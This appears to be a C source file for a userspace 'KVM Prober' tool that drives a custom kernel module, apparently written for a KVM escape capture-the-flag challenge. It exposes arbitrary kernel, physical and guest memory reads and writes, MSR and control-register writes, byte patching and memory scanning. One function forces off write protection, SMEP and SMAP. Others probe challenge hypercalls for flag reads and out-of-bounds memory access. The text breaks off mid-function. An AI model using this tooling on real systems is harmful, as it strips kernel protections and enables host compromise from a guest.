/*
 * KVM Prober - Userspace Tool v2.2
 * Companion tool for kvm_probe_drv.c
 * 
 * FIXES:
 * - Security disabling now forces through driver
 * - VMX handlers display details
 * - Symbol lookup shows all matches
 * - Guest memory mapping and gap scanning
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <errno.h>
#include <time.h>
#include <ctype.h>

#define DEVICE_FILE "/dev/kvm_probe_dev"
#define MAX_SYMBOL_NAME 128
#define MAX_READ_SIZE (1024 * 1024)

/* IOCTL Definitions */
#define IOCTL_BASE 0x4000
#define IOCTL_LOOKUP_SYMBOL          (IOCTL_BASE + 0x01)
#define IOCTL_GET_SYMBOL_COUNT       (IOCTL_BASE + 0x02)
#define IOCTL_GET_SYMBOL_BY_INDEX    (IOCTL_BASE + 0x03)
#define IOCTL_FIND_SYMBOL_BY_NAME    (IOCTL_BASE + 0x04)
#define IOCTL_GET_VMX_HANDLERS       (IOCTL_BASE + 0x05)
#define IOCTL_GET_SVM_HANDLERS       (IOCTL_BASE + 0x06)
#define IOCTL_SEARCH_SYMBOLS         (IOCTL_BASE + 0x07)
#define IOCTL_GET_VMX_HANDLER_INFO   (IOCTL_BASE + 0x08)
#define IOCTL_SEARCH_SYMBOLS_EXT     (IOCTL_BASE + 0x09)

#define IOCTL_READ_KERNEL_MEM        (IOCTL_BASE + 0x10)
#define IOCTL_READ_PHYSICAL_MEM      (IOCTL_BASE + 0x11)
#define IOCTL_READ_GUEST_MEM         (IOCTL_BASE + 0x12)
#define IOCTL_SCAN_MEMORY_REGION     (IOCTL_BASE + 0x13)
#define IOCTL_FIND_MEMORY_PATTERN    (IOCTL_BASE + 0x14)
#define IOCTL_READ_CR_REGISTER       (IOCTL_BASE + 0x15)
#define IOCTL_READ_MSR               (IOCTL_BASE + 0x16)
#define IOCTL_DUMP_PAGE_TABLES       (IOCTL_BASE + 0x17)
#define IOCTL_GET_KASLR_INFO         (IOCTL_BASE + 0x1A)
#define IOCTL_READ_PFN_DATA          (IOCTL_BASE + 0x1C)
#define IOCTL_MAP_GUEST_MEMORY       (IOCTL_BASE + 0x1D)
#define IOCTL_SCAN_UNMAPPED_REGIONS  (IOCTL_BASE + 0x1E)
#define IOCTL_SCAN_FOR_DATA          (IOCTL_BASE + 0x1F)

#define IOCTL_WRITE_KERNEL_MEM       (IOCTL_BASE + 0x20)
#define IOCTL_WRITE_PHYSICAL_MEM     (IOCTL_BASE + 0x21)
#define IOCTL_WRITE_GUEST_MEM        (IOCTL_BASE + 0x22)
#define IOCTL_WRITE_MSR              (IOCTL_BASE + 0x23)
#define IOCTL_WRITE_CR_REGISTER      (IOCTL_BASE + 0x24)
#define IOCTL_MEMSET_KERNEL          (IOCTL_BASE + 0x25)
#define IOCTL_MEMSET_PHYSICAL        (IOCTL_BASE + 0x26)
#define IOCTL_COPY_KERNEL_MEM        (IOCTL_BASE + 0x27)
#define IOCTL_PATCH_BYTES            (IOCTL_BASE + 0x28)
#define IOCTL_WRITE_PHYSICAL_PFN     (IOCTL_BASE + 0x29)

#define IOCTL_GPA_TO_HVA             (IOCTL_BASE + 0x30)
#define IOCTL_GFN_TO_HVA             (IOCTL_BASE + 0x31)
#define IOCTL_GFN_TO_PFN             (IOCTL_BASE + 0x32)
#define IOCTL_GPA_TO_GFN             (IOCTL_BASE + 0x33)
#define IOCTL_GFN_TO_GPA             (IOCTL_BASE + 0x34)
#define IOCTL_HVA_TO_PFN             (IOCTL_BASE + 0x35)
#define IOCTL_HVA_TO_GFN             (IOCTL_BASE + 0x36)
#define IOCTL_PFN_TO_HVA             (IOCTL_BASE + 0x37)
#define IOCTL_VIRT_TO_PHYS           (IOCTL_BASE + 0x38)
#define IOCTL_PHYS_TO_VIRT           (IOCTL_BASE + 0x39)
#define IOCTL_VIRT_TO_PFN            (IOCTL_BASE + 0x3A)
#define IOCTL_PAGE_TO_PFN            (IOCTL_BASE + 0x3B)
#define IOCTL_PFN_TO_PAGE            (IOCTL_BASE + 0x3C)
#define IOCTL_SPTE_TO_PFN            (IOCTL_BASE + 0x3D)
#define IOCTL_WALK_EPT               (IOCTL_BASE + 0x3E)
#define IOCTL_TRANSLATE_GVA          (IOCTL_BASE + 0x3F)

/* Cache Operations */
#define IOCTL_WBINVD                 (IOCTL_BASE + 0x40)
#define IOCTL_CLFLUSH                (IOCTL_BASE + 0x41)
#define IOCTL_WRITE_AND_FLUSH        (IOCTL_BASE + 0x42)

/* AHCI Direct Access */
#define IOCTL_AHCI_INIT              (IOCTL_BASE + 0x50)
#define IOCTL_AHCI_READ_REG          (IOCTL_BASE + 0x51)
#define IOCTL_AHCI_WRITE_REG         (IOCTL_BASE + 0x52)
#define IOCTL_AHCI_SET_FIS_BASE      (IOCTL_BASE + 0x53)
#define IOCTL_AHCI_INFO              (IOCTL_BASE + 0x54)

#define IOCTL_HYPERCALL              (IOCTL_BASE + 0x60)
#define IOCTL_HYPERCALL_BATCH        (IOCTL_BASE + 0x61)

#define IOCTL_SET_AUTO_SECURITY      (IOCTL_BASE + 0x70)
#define IOCTL_FORCE_DISABLE_SECURITY (IOCTL_BASE + 0x71)

/* Function prototypes */
void read_cr_register(int cr_num);

/* Data Structures */
struct symbol_request {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    char description[256];
};

struct vmx_handler_info {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    int exit_reason;
};

struct kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

struct physical_mem_read {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

struct guest_mem_read {
    unsigned long gpa;
    unsigned long gva;
    unsigned long length;
    unsigned char *user_buffer;
    int mode;
};

struct mem_region {
    unsigned long start;
    unsigned long end;
    unsigned long step;
    unsigned char *buffer;
    size_t buffer_size;
    int region_type;
};

struct mem_pattern {
    unsigned char pattern[16];
    size_t pattern_len;
    int match_offset;
};

struct scan_request {
    struct mem_region region;
    struct mem_pattern pattern;
};

struct symbol_search_request {
    char pattern[MAX_SYMBOL_NAME];
    struct symbol_request *results;
    int max_results;
    int actual_count;
};

struct pattern_search_request {
    unsigned long start;
    unsigned long end;
    unsigned char pattern[16];
    size_t pattern_len;
    unsigned long found_addr;
};

struct cr_register_request {
    int cr_num;
    unsigned long value;
};

struct msr_read_request {
    unsigned int msr;
    unsigned long long value;
};

struct page_table_dump {
    unsigned long virtual_addr;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    unsigned long physical_addr;
    unsigned int flags;
};

struct kaslr_info {
    unsigned long kernel_base;
    unsigned long kaslr_slide;
    unsigned long physmap_base;
    unsigned long vmalloc_base;
    unsigned long vmemmap_base;
};

struct kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buffer;
    int disable_wp;
};

struct physical_mem_write {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

struct guest_mem_write {
    unsigned long gpa;
    unsigned long gva;
    unsigned long length;
    unsigned char *user_buffer;
    int mode;
};

struct msr_write_request {
    unsigned int msr;
    unsigned long long value;
};

struct cr_write_request {
    int cr_num;
    unsigned long value;
    unsigned long mask;
};

struct memset_request {
    unsigned long addr;
    unsigned char value;
    unsigned long length;
    int addr_type;
};

struct patch_request {
    unsigned long addr;
    unsigned char original[32];
    unsigned char patch[32];
    size_t length;
    int verify_original;
    int addr_type;
};

struct addr_conv_request {
    unsigned long input_addr;
    unsigned long output_addr;
    int status;
};

struct gpa_to_hva_request {
    unsigned long gpa;
    unsigned long hva;
    unsigned long gfn;
    int vm_fd;
    int status;
};

struct gfn_to_hva_request {
    unsigned long gfn;
    unsigned long hva;
    int vm_fd;
    int status;
};

struct gfn_to_pfn_request {
    unsigned long gfn;
    unsigned long pfn;
    int vm_fd;
    int status;
};

struct hva_to_pfn_request {
    unsigned long hva;
    unsigned long pfn;
    int writable;
    int status;
};

struct virt_to_phys_request {
    unsigned long virt_addr;
    unsigned long phys_addr;
    unsigned long pfn;
    unsigned long offset;
    int status;
};

struct phys_to_virt_request {
    unsigned long phys_addr;
    unsigned long virt_addr;
    int use_ioremap;
    int status;
};

struct spte_to_pfn_request {
    unsigned long spte;
    unsigned long pfn;
    unsigned long flags;
    int present;
    int writable;
    int executable;
    int status;
};

struct ept_walk_request {
    unsigned long eptp;
    unsigned long gpa;
    unsigned long hpa;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    int page_size;
    int status;
};

struct gva_translate_request {
    unsigned long gva;
    unsigned long gpa;
    unsigned long hva;
    unsigned long hpa;
    unsigned long cr3;
    int access_type;
    int status;
};


struct clflush_request {
    uint64_t virt_addr;
    uint64_t phys_addr;
    int use_phys;
};

struct write_flush_request {
    uint64_t phys_addr;
    uint64_t buffer;
    size_t size;
};

struct ahci_info {
    uint32_t cap;
    uint32_t ghc;
    uint32_t pi;
    uint32_t vs;
    uint32_t port_ssts[6];
};

struct ahci_reg_request {
    int port;
    uint32_t offset;
    uint32_t value;
    int is_write;
};

struct ahci_fis_request {
    int port;
    uint64_t fis_base;
    uint64_t clb_base;
};

struct hypercall_request {
    unsigned long nr;
    unsigned long a0;
    unsigned long a1;
    unsigned long a2;
    unsigned long a3;
    unsigned long ret;
};

struct hypercall_batch_result {
    unsigned long ret_100;
    unsigned long ret_101;
    unsigned long ret_102;
    unsigned long ret_103;
};

struct guest_memory_map {
    unsigned long start_gpa;
    unsigned long end_gpa;
    unsigned long size;
    int num_regions;
    unsigned long regions[64][2];
};

struct scan_for_data_request {
    unsigned long start_addr;
    unsigned long end_addr;
    unsigned long step;
    unsigned long *results;
    int max_results;
    int region_type;
};

/* Global Variables */
static int fd = -1;

/* Utility Functions */
void hex_dump(const unsigned char *data, size_t size, unsigned long base_addr) {
    for (size_t i = 0; i < size; i += 16) {
        printf("0x%016lx: ", base_addr + i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size) printf("%02x ", data[i + j]);
            else printf("   ");
            if (j == 7) printf(" ");
        }
        printf(" |");
        for (size_t j = 0; j < 16 && i + j < size; j++) {
            unsigned char c = data[i + j];
            printf("%c", (c >= 32 && c <= 126) ? c : '.');
        }
        printf("|\n");
    }
}

int parse_hex_pattern(const char *hex_str, unsigned char *pattern, size_t max_len) {
    size_t len = strlen(hex_str);
    size_t pattern_len = len / 2;
    if (len % 2 != 0 || pattern_len > max_len) return -1;
    for (size_t i = 0; i < pattern_len; i++) {
        if (sscanf(hex_str + 2*i, "%2hhx", &pattern[i]) != 1) return -1;
    }
    return pattern_len;
}

int init_driver(void) {
    fd = open(DEVICE_FILE, O_RDWR);
    if (fd < 0) {
        perror("[-] Failed to open device");
        printf("    Load module: sudo insmod kvm_probe_drv.ko\n");
        return -1;
    }
    printf("[+] Driver initialized\n");
    return 0;
}

/* ========================================================================
 * Security Control - FIXED
 * ======================================================================== */

void read_cr_register(int cr_num) {
    struct cr_register_request req = { .cr_num = cr_num, .value = 0 };
    if (ioctl(fd, IOCTL_READ_CR_REGISTER, &req) < 0) {
        perror("[-] read CR failed");
        return;
    }
    printf("[+] CR%d = 0x%lx\n", cr_num, req.value);
    
    if (cr_num == 0) {
        printf("    WP (16): %s\n", (req.value & (1UL<<16)) ? "ENABLED" : "DISABLED");
        printf("    PG (31): %s\n", (req.value & (1UL<<31)) ? "ENABLED" : "DISABLED");
    } else if (cr_num == 3) {
        printf("    PML4 phys: 0x%lx\n", req.value & ~0xFFFUL);
    } else if (cr_num == 4) {
        printf("    SMEP (20): %s\n", (req.value & (1UL<<20)) ? "ENABLED" : "DISABLED");
        printf("    SMAP (21): %s\n", (req.value & (1UL<<21)) ? "ENABLED" : "DISABLED");
    }
}

 void force_disable_security(void) {
    printf("[!] Forcing security features OFF in kernel...\n");
    
    if (ioctl(fd, IOCTL_FORCE_DISABLE_SECURITY, 0) < 0) {
        perror("[-] force_disable_security failed");
        return;
    }
    
    /* Give kernel time to apply changes */
    usleep(10000);
    
    /* Verify by reading registers */
    printf("\n[*] Verifying security status:\n");
    read_cr_register(0);
    printf("\n");
    read_cr_register(4);
    printf("\n[+] Security bypass applied\n");
}

void set_auto_security(int enable) {
    int val = enable;
    printf("[*] Setting auto-security bypass: %s\n", enable ? "ON" : "OFF");
    
    if (ioctl(fd, IOCTL_SET_AUTO_SECURITY, &val) < 0) {
        perror("[-] set_auto_security failed");
        return;
    }
    
    printf("[+] Auto-security bypass %s\n", enable ? "enabled" : "disabled");
}

/* ========================================================================
 * Hypercall Operations
 * ======================================================================== */

void do_hypercall(unsigned long nr, unsigned long a0, unsigned long a1, 
                  unsigned long a2, unsigned long a3) {
    struct hypercall_request req = {
        .nr = nr,
        .a0 = a0,
        .a1 = a1,
        .a2 = a2,
        .a3 = a3,
        .ret = 0
    };
    
    if (ioctl(fd, IOCTL_HYPERCALL, &req) < 0) {
        perror("[-] hypercall failed");
        return;
    }
    
    if (req.ret != 0 && req.ret != ~0UL) {
        printf("[+] Hypercall %lu returned: 0x%lx\n", nr, req.ret);
        
        unsigned char *p = (unsigned char *)&req.ret;
        printf("    Bytes: ");
        for (int i = 0; i < 8; i++) {
            printf("%02x ", p[i]);
        }
        printf("\n");
        
        int printable = 1;
        int has_content = 0;
        for (int i = 0; i < 8; i++) {
            if (p[i] == 0) continue;
            has_content = 1;
            if (p[i] < 0x20 || p[i] > 0x7e) {
                printable = 0;
                break;
            }
        }
        if (printable && has_content) {
            printf("    ASCII: %.8s\n", (char *)&req.ret);
        }
    } else {
        printf("[*] Hypercall %lu returned: 0x%lx\n", nr, req.ret);
    }
}

void hypercall_batch(void) {
    struct hypercall_batch_result result;
    
    if (ioctl(fd, IOCTL_HYPERCALL_BATCH, &result) < 0) {
        perror("[-] hypercall_batch failed");
        return;
    }
    
    printf("[*] CTF Hypercall Batch Results:\n");
    
    if (result.ret_100 != 0 && result.ret_100 != ~0UL) {
        printf("[+] HC 100: 0x%lx", result.ret_100);
        unsigned char *p = (unsigned char *)&result.ret_100;
        int printable = 1;
        for (int i = 0; i < 8 && p[i]; i++) {
            if (p[i] < 0x20 || p[i] > 0x7e) { printable = 0; break; }
        }
        if (printable && p[0]) printf(" (ASCII: %.8s)", (char *)&result.ret_100);
        printf("\n");
    } else {
        printf("    HC 100: 0x%lx\n", result.ret_100);
    }
    
    if (result.ret_101 != 0 && result.ret_101 != ~0UL) {
        printf("[+] HC 101: 0x%lx\n", result.ret_101);
    } else {
        printf("    HC 101: 0x%lx\n", result.ret_101);
    }
    
    if (result.ret_102 != 0 && result.ret_102 != ~0UL) {
        printf("[+] HC 102: 0x%lx\n", result.ret_102);
    } else {
        printf("    HC 102: 0x%lx\n", result.ret_102);
    }
    
    if (result.ret_103 != 0 && result.ret_103 != ~0UL) {
        printf("[+] HC 103: 0x%lx\n", result.ret_103);
    } else {
        printf("    HC 103: 0x%lx\n", result.ret_103);
    }
}

void hypercall_scan(unsigned long start, unsigned long end) {
    printf("[*] Scanning hypercalls %lu to %lu...\n", start, end);
    
    for (unsigned long nr = start; nr <= end; nr++) {
        struct hypercall_request req = {
            .nr = nr,
            .a0 = 0,
            .a1 = 0,
            .a2 = 0,
            .a3 = 0,
            .ret = 0
        };
        
        if (ioctl(fd, IOCTL_HYPERCALL, &req) < 0) {
            continue;
        }
        
        if (req.ret != 0 && req.ret != ~0UL) {
            printf("[+] HC %lu: 0x%lx", nr, req.ret);
            
            unsigned char *p = (unsigned char *)&req.ret;
            int printable = 1;
            for (int i = 0; i < 8 && p[i]; i++) {
                if (p[i] < 0x20 || p[i] > 0x7e) { printable = 0; break; }
            }
            if (printable && p[0]) {
                printf(" (%.8s)", (char *)&req.ret);
            }
            printf("\n");
        }
    }
    printf("[*] Scan complete\n");
}

void test_ctf_hypercalls(void) {
    printf("[*] Testing KVM CTF Hypercalls:\n\n");
    
    printf("=== Hypercall 100 (Flag Read) ===\n");
    do_hypercall(100, 0, 0, 0, 0);
    
    printf("\n=== Hypercall 101 (Relative Write - KASAN) ===\n");
    do_hypercall(101, 0, 0, 0, 0);
    
    printf("\n=== Hypercall 102 (Relative Read - KASAN) ===\n");
    do_hypercall(102, 0, 0, 0, 0);
    
    printf("\n=== Hypercall 103 (DoS) - SKIPPED (dangerous) ===\n");
    
    printf("\n[*] CTF hypercall test complete\n");
}

/* ========================================================================
 * Symbol Operations - ENHANCED
 * ======================================================================== */

void lookup_symbol(const char *name) {
    struct symbol_request req = {0};
    struct symbol_request results[16];
    int i, found_count = 0;
    
    strncpy(req.name, name, MAX_SYMBOL_NAME - 1);
    
    /* Try exact match first */
    if (ioctl(fd, IOCTL_LOOKUP_SYMBOL, &req) >= 0 && req.address) {
        printf("[+] EXACT MATCH:\n");
        printf("    %s @ 0x%lx\n", req.name, req.address);
        if (req.description[0]) printf("    %s\n", req.description);
        found_count = 1;
    }
    
    /* Also search for partial matches */
    /* First get count */
    int count = ioctl(fd, IOCTL_SEARCH_SYMBOLS, (void *)name);
    
    if (count > 0) {
        if (count > 16) count = 16;
        
        /* Actually retrieve the results */
        /* We need to pass a request structure that can hold multiple results */
        struct {
            char pattern[MAX_SYMBOL_NAME];
            struct symbol_request results[16];
            int max_results;
            int actual_count;
        } search_req;
        
        strncpy(search_req.pattern, name, MAX_SYMBOL_NAME - 1);
        search_req.max_results = 16;
        search_req.actual_count = 0;
        
        /* Use the SEARCH_SYMBOLS ioctl with the extended structure */
        if (ioctl(fd, IOCTL_SEARCH_SYMBOLS, &search_req) >= 0) {
            if (found_count > 0) {
                printf("\n[+] PARTIAL MATCHES (%d):\n", search_req.actual_count - 1);
                /* Skip the first one if it's the exact match we already printed */
                i = 1;
            } else {
                printf("[+] PARTIAL MATCHES (%d):\n", search_req.actual_count);
                i = 0;
            }
            
            for (; i < search_req.actual_count && i < 16; i++) {
                printf("  [%d] %-40s @ 0x%lx\n", i, 
                       search_req.results[i].name, 
                       search_req.results[i].address);
                if (search_req.results[i].description[0]) {
                    printf("       %s\n", search_req.results[i].description);
                }
            }
        } else {
            printf("[*] Found %d matches, but couldn't retrieve details\n", count);
            printf("    Run 'search %s' to see all partial matches\n", name);
        }
    }
    
    if (found_count == 0 && count <= 0) {
        printf("[-] Symbol '%s' not found (no exact or partial matches)\n", name);
    }
}

void get_symbol_count(void) {
    unsigned int count;
    if (ioctl(fd, IOCTL_GET_SYMBOL_COUNT, &count) < 0) {
        perror("[-] get_symbol_count failed");
        return;
    }
    printf("[+] Found %u KVM symbols\n", count);
}

void list_symbols(int max_count) {
    unsigned int count;
    if (ioctl(fd, IOCTL_GET_SYMBOL_COUNT, &count) < 0) return;
    if (max_count > 0 && (unsigned)max_count < count) count = max_count;
    
    printf("[+] Listing %u symbols:\n", count);
    for (unsigned int i = 0; i < count; i++) {
        struct symbol_request req = {0};
        unsigned int idx = i;
        if (ioctl(fd, IOCTL_GET_SYMBOL_BY_INDEX, &idx) >= 0 &&
            ioctl(fd, IOCTL_GET_SYMBOL_BY_INDEX, &req) >= 0) {
            printf("  [%u] %-40s 0x%lx  %s\n", i, req.name, req.address, req.description);
        }
    }
}

void search_symbols(const char *pattern) {
    /* Simple implementation using the existing SEARCH_SYMBOLS ioctl */
    struct symbol_search_request req;
    struct symbol_request results[16];
    
    strncpy(req.pattern, pattern, MAX_SYMBOL_NAME - 1);
    req.results = results;
    req.max_results = 16;
    req.actual_count = 0;
    
    if (ioctl(fd, IOCTL_SEARCH_SYMBOLS_EXT, &req) < 0) {
        /* Fall back to the old method */
        int count = ioctl(fd, IOCTL_SEARCH_SYMBOLS, (void *)pattern);
        if (count <= 0) {
            printf("[-] No symbols match '%s'\n", pattern);
            return;
        }
        printf("[+] Found %d symbols matching '%s' (use 'lookup' for details)\n", count, pattern);
        return;
    }
    
    if (req.actual_count > 0) {
        printf("[+] Found %d symbols matching '%s':\n", req.actual_count, pattern);
        for (int i = 0; i < req.actual_count && i < 16; i++) {
            printf("  [%d] %-40s @ 0x%lx", i, results[i].name, results[i].address);
            if (results[i].description[0]) {
                printf(" - %s", results[i].description);
            }
            printf("\n");
        }
    } else {
        printf("[-] No symbols match '%s'\n", pattern);
    }
}

void find_symbol_by_name(const char *name) {
    struct symbol_request req = {0};
    strncpy(req.name, name, MAX_SYMBOL_NAME - 1);
    if (ioctl(fd, IOCTL_FIND_SYMBOL_BY_NAME, &req) < 0) {
        printf("[-] No symbol contains '%s'\n", name);
        return;
    }
    printf("[+] Found: %s @ 0x%lx - %s\n", req.name, req.address, req.description);
}

void analyze_vmx_handlers(void) {
    int count;
    struct vmx_handler_info handlers[32];
    
    if (ioctl(fd, IOCTL_GET_VMX_HANDLERS, &count) < 0) {
        perror("[-] get_vmx_handlers failed");
        return;
    }
    
    printf("[+] Found %d VMX exit handlers:\n\n", count);
    
    int ret = ioctl(fd, IOCTL_GET_VMX_HANDLER_INFO, handlers);
    if (ret < 0) {
        perror("[-] get_vmx_handler_info failed");
        return;
    }
    
    printf("%-35s %-18s %s\n", "Handler", "Address", "Exit Reason");
    printf("%-35s %-18s %s\n", "-------", "-------", "-----------");
    
    for (int i = 0; i < ret && i < 32; i++) {
        printf("%-35s 0x%016lx %d\n", 
               handlers[i].name, 
               handlers[i].address,
               handlers[i].exit_reason);
    }
    
    printf("\n[*] Key exit reasons:\n");
    printf("    0  = Exception/NMI\n");
    printf("    1  = External interrupt\n");
    printf("    7  = Interrupt window\n");
    printf("    10 = CPUID\n");
    printf("    12 = HLT\n");
    printf("    18 = VMCALL\n");
    printf("    28 = CR access\n");
    printf("    30 = I/O instruction\n");
    printf("    31 = RDMSR\n");
    printf("    32 = WRMSR\n");
    printf("    48 = EPT violation\n");
    printf("    49 = EPT misconfiguration\n");
}

void analyze_svm_handlers(void) {
    int count;
    if (ioctl(fd, IOCTL_GET_SVM_HANDLERS, &count) < 0) return;
    printf("[+] Found %d SVM exit handlers\n", count);
}

/* ========================================================================
 * Guest Memory Mapping
 * ======================================================================== */

void map_guest_memory(void) {
    struct guest_memory_map map;
    
    printf("[*] Mapping guest memory regions...\n");
    printf("[*] This may take a moment...\n\n");
    
    if (ioctl(fd, IOCTL_MAP_GUEST_MEMORY, &map) < 0) {
        perror("[-] map_guest_memory failed");
        return;
    }
    
    printf("[+] Guest Memory Map:\n");
    printf("    Total regions: %d\n", map.num_regions);
    printf("    Total size: 0x%lx (%lu MB)\n\n", map.size, map.size / (1024*1024));
    
    printf("    %-18s %-18s %s\n", "Start GPA", "End GPA", "Size");
    printf("    %-18s %-18s %s\n", "---------", "-------", "----");
    
    for (int i = 0; i < map.num_regions; i++) {
        unsigned long start = map.regions[i][0];
        unsigned long end = map.regions[i][1];
        unsigned long size = end - start;
        
        printf("    0x%016lx 0x%016lx 0x%lx (%lu MB)\n", 
               start, end, size, size / (1024*1024));
    }
    
    /* Identify gaps (unmapped regions) */
    printf("\n[*] Unmapped regions (gaps):\n");
    for (int i = 0; i < map.num_regions - 1; i++) {
        unsigned long gap_start = map.regions[i][1];
        unsigned long gap_end = map.regions[i+1][0];
        unsigned long gap_size = gap_end - gap_start;
        
        if (gap_size > 0) {
            printf("    GAP: 0x%016lx - 0x%016lx (0x%lx / %lu MB)\n",
                   gap_start, gap_end, gap_size, gap_size / (1024*1024));
        }
    }
}

void scan_unmapped_for_data(unsigned long start, unsigned long end) {
    struct scan_for_data_request req;
    unsigned long *results;
    int max_results = 1000;
    int found;
    
    printf("[!] Scanning unmapped regions for ANY non-zero data\n");
    printf("[*] This will scan 0x%lx - 0x%lx\n", start, end);
    printf("[*] Errors will be handled gracefully and scan will continue\n\n");
    
    /* First show mapped regions for context */
    printf("[*] Current memory map:\n");
    map_guest_memory();
    
    printf("\n[*] Press Enter to start scanning unmapped regions, or Ctrl+C to abort...\n");
    getchar();
    
    results = malloc(max_results * sizeof(unsigned long));
    if (!results) { 
        perror("malloc"); 
        return; 
    }
    
    req.start_addr = start;
    req.end_addr = end;
    req.step = 0x1000;  /* Page-aligned scan */
    req.results = results;
    req.max_results = max_results;
    req.region_type = 0;  /* Physical memory */
    
    printf("[*] Scanning... (this may take a while)\n");
    printf("[*] Kernel will skip errors and continue\n\n");
    
    found = ioctl(fd, IOCTL_SCAN_FOR_DATA, &req);
    
    if (found > 0) {
        printf("[+] Found %d addresses with non-zero data:\n\n", found);
        
        /* Group nearby addresses */
        printf("    %-18s %s\n", "Address", "Notes");
        printf("    %-18s %s\n", "-------", "-----");
        
        unsigned long prev_addr = 0;
        int in_gap = 0;
        
        for (int i = 0; i < found && i < max_results; i++) {
            unsigned long addr = results[i];
            
            /* Check if this is in a large gap from previous */
            if (i == 0) {
                printf("\n[Region 1]\n");
                printf("    0x%016lx  <-- Data found\n", addr);
                in_gap = 0;
            } else if ((addr - prev_addr) > 0x100000) {
                /* New region - significant gap */
                printf("\n[Region %d] Gap: 0x%lx bytes\n", 
                       (i/100) + 2, addr - prev_addr);
                printf("    0x%016lx\n", addr);
                in_gap = 0;
            } else if ((addr - prev_addr) > 0x1000 && !in_gap) {
                /* Small gap within region */
                printf("    ... gap: 0x%lx ...\n", addr - prev_addr);
                printf("    0x%016lx\n", addr);
                in_gap = 1;
            } else {
                /* Close to previous */
                printf("    0x%016lx\n", addr);
                in_gap = 0;
            }
            
            prev_addr = addr;
        }
        
        if (found >= max_results) {
            printf("\n[!] Maximum results (%d) reached, scan incomplete\n", max_results);
        }
        
        printf("\n[*] Scan complete. Found %d data locations.\n", found);
        printf("    To read these addresses: sudo ./kvm_prober read_phys <addr> 0x100\n");
        
        /* Let user quickly read the first few */
        if (found > 0) {
            printf("\n[*] Quick read of first 3 locations:\n");
            for (int i = 0; i < 3 && i < found; i++) {
                printf("\n--- Address 0x%lx ---\n", results[i]);
                read_physical_mem(results[i], 0x40);  /* Read 64 bytes */
            }
        }
        
    } else if (found == 0) {
        printf("[-] No non-zero data found in unmapped regions\n");
        printf("    (All scanned addresses were zero or inaccessible)\n");
    } else {
        printf("[-] Scan failed with error: %d\n", found);
    }
    
    free(results);
}

/* ========================================================================
 * Memory Read Operations
 * ======================================================================== */

void read_kernel_mem(unsigned long addr, size_t size) {
    if (size > MAX_READ_SIZE) { printf("[-] Size too large\n"); return; }
    unsigned char *buf = malloc(size);
    if (!buf) { perror("malloc"); return; }
    
    struct kernel_mem_read req = { .kernel_addr = addr, .length = size, .user_buffer = buf };
    printf("[*] Reading kernel memory at 0x%lx (%zu bytes)\n", addr, size);
    
    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        perror("[-] read failed");
    } else {
        printf("[+] Success:\n");
        hex_dump(buf, size, addr);
    }
    free(buf);
}

void read_physical_mem(unsigned long phys_addr, size_t size) {
    if (size > MAX_READ_SIZE) { printf("[-] Size too large\n"); return; }
    unsigned char *buf = malloc(size);
    if (!buf) { perror("malloc"); return; }
    
    struct physical_mem_read req = { .phys_addr = phys_addr, .length = size, .user_buffer = buf };
    printf("[*] Reading physical memory at 0x%lx (%zu bytes)\n", phys_addr, size);
    
    if (ioctl(fd, IOCTL_READ_PHYSICAL_MEM, &req) < 0) {
        perror("[-] read failed");
    } else {
        printf("[+] Success:\n");
        hex_dump(buf, size, phys_addr);
    }
    free(buf);
}

void read_guest_mem(unsigned long gpa, size_t size, int mode) {
    const char *modes[] = {"GPA", "GVA", "GFN"};
    if (size > MAX_READ_SIZE) { printf("[-] Size too large\n"); return; }
    unsigned char *buf = malloc(size);
    if (!buf) { perror("malloc"); return; }
    
    struct guest_mem_read req = { .gpa = gpa, .gva = 0, .length = size, .user_buffer = buf, .mode = mode };
    printf("[*] Reading guest %s 0x%lx (%zu bytes)\n", modes[mode % 3], gpa, size);
    
    if (ioctl(fd, IOCTL_READ_GUEST_MEM, &req) < 0) {
        perror("[-] read failed");
    } else {
        printf("[+] Success:\n");
        hex_dump(buf, size, gpa);
    }
    free(buf);
}

void scan_memory(unsigned long start, unsigned long end, unsigned long step, 
                 int type, const char *pattern_hex) {
    const char *types[] = {"physical", "kernel", "guest"};
    struct scan_request req = {0};
    
    int plen = parse_hex_pattern(pattern_hex, req.pattern.pattern, 16);
    if (plen < 0) { printf("[-] Invalid pattern\n"); return; }
    
    size_t max_results = 256;
    unsigned long *results = malloc(max_results * sizeof(unsigned long));
    if (!results) { perror("malloc"); return; }
    
    req.region.start = start;
    req.region.end = end;
    req.region.step = step;
    req.region.buffer = (unsigned char *)results;
    req.region.buffer_size = max_results * sizeof(unsigned long);
    req.region.region_type = type;
    req.pattern.pattern_len = plen;
    req.pattern.match_offset = -1;
    
    printf("[*] Scanning %s 0x%lx-0x%lx for pattern\n", types[type % 3], start, end);
    
    int found = ioctl(fd, IOCTL_SCAN_MEMORY_REGION, &req);
    if (found > 0) {
        printf("[+] Found %d matches:\n", found);
        for (int i = 0; i < found && i < (int)max_results; i++)
            printf("  [%d] 0x%lx\n", i, results[i]);
    } else {
        printf("[-] No matches\n");
    }
    free(results);
}

void find_pattern(unsigned long start, unsigned long end, const char *pattern_hex) {
    struct pattern_search_request req = {0};
    int plen = parse_hex_pattern(pattern_hex, req.pattern, 16);
    if (plen < 0) { printf("[-] Invalid pattern\n"); return; }
    
    req.start = start;
    req.end = end;
    req.pattern_len = plen;
    
    printf("[*] Searching 0x%lx-0x%lx\n", start, end);
    if (ioctl(fd, IOCTL_FIND_MEMORY_PATTERN, &req) < 0) {
        printf("[-] Pattern not found\n");
    } else {
        printf("[+] Found at 0x%lx\n", req.found_addr);
    }
}

void read_msr_register(unsigned int msr) {
    struct msr_read_request req = { .msr = msr, .value = 0 };
    if (ioctl(fd, IOCTL_READ_MSR, &req) < 0) {
        perror("[-] read MSR failed");
        return;
    }
